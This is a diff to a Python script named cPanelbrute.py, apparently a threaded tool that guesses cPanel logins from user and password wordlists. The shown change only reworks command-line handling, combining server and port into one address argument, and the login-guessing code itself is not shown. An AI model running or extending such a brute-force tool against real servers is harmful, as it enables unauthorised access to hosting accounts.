@@ -10,19 +10,19 @@ def timer():
 	now = time.localtime(time.time())
 	return time.asctime(now)
 	
-if len(sys.argv) !=5:
-	print ("\nUsage: ./cPanelbrute.py <server> <port> <userlist> <wordlist>\n")
-	print ("ex: python cPanelbrute.py example.com 2082 users.txt wordlist.txt\n")
+if len(sys.argv) !=4:
+	print ("\nUsage: ./cPanelbrute.py <address> <userlist> <wordlist>\n")
+	print ("ex: python cPanelbrute.py example.com:2082 users.txt wordlist.txt\n")
 	sys.exit(1)
 
 try:
-  	users = open(sys.argv[3], "r").readlines()
+  	users = open(sys.argv[2], "r").readlines()
 except(IOError): 
   	print ("Error: Check your userlist path\n")
   	sys.exit(1)
   
 try:
-  	words = open(sys.argv[4], "r").readlines()
+  	words = open(sys.argv[3], "r").readlines()
 except(IOError): 
   	print ("Error: Check your wordlist path\n")
   	sys.exit(1)
@@ -93,18 +93,10 @@ class Worker(threading.Thread):
 		
 if sys.argv[1][-1] == "/":
 	sys.argv[1] = sys.argv[1][:-1] 
-server = sys.argv[1]+":2082"
-if sys.argv[2].isdigit() == False:
-	print ("[-] Port must be a number\n")
-	sys.exit(1)
-else:
-	port = sys.argv[2] 
-if sys.argv[1][-1] == "/":
-	sys.argv[1] = sys.argv[1][:-1] 
-server = sys.argv[1]+":"+port
+server = sys.argv[1]
+
 
 print ("[+] Server:",server)
-print ("[+] Port:",port)
 print ("[+] Users Loaded:",len(users))
 print ("[+] Words Loaded:",len(words))
 print ("[+]",getauth(server))
